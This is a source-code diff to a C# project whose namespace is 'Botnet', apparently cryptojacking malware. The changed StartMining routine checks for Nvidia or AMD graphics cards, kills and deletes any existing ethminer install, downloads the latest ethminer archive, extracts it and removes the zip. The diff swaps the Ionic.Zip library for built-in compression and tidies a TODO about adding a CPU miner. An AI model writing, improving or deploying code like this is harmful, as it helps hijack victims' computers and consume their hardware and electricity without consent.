@@ -1,5 +1,4 @@
-﻿using Ionic.Zip;
-using Newtonsoft.Json;
+﻿using Newtonsoft.Json;
 using System;
 using System.Collections.Specialized;
 using System.Diagnostics;
@@ -470,7 +469,7 @@ namespace Botnet
             }).Start();
         }
 
-        //TODO add CPU miner
+        // TODO: add CPU miner
         private static void StartMining()
         {
             if (HardwareInfo.IsNvidiaCardInstalled() || HardwareInfo.IsAmdCardInstalled())
@@ -481,12 +480,10 @@ namespace Botnet
                         Utility.KillProcessByPath(Utility.ethminerDir + Utility.ethminerName);
                     Utility.DeleteDirectory(Utility.ethminerDir);
                     Directory.CreateDirectory(Utility.ethminerDir);
-                    Utility.DownloadFile(Utility.GetLatestEthminerURL(), Utility.ethminerDir + Utility.ethminerZipName);
-                    using (ZipFile zip = ZipFile.Read(Utility.ethminerDir + Utility.ethminerZipName))
-                    {
-                        zip.ExtractAll(Utility.ethminerDir);
-                    }
-                    File.Delete(Utility.ethminerDir + Utility.ethminerZipName);
+                    string zipPath = Utility.ethminerDir + Utility.ethminerZipName;
+                    Utility.DownloadFile(Utility.GetLatestEthminerURL(), zipPath);
+                    System.IO.Compression.ZipFile.ExtractToDirectory(zipPath, Utility.ethminerDir);
+                    File.Delete(zipPath);
                 }
                 new Thread(() =>
                 {
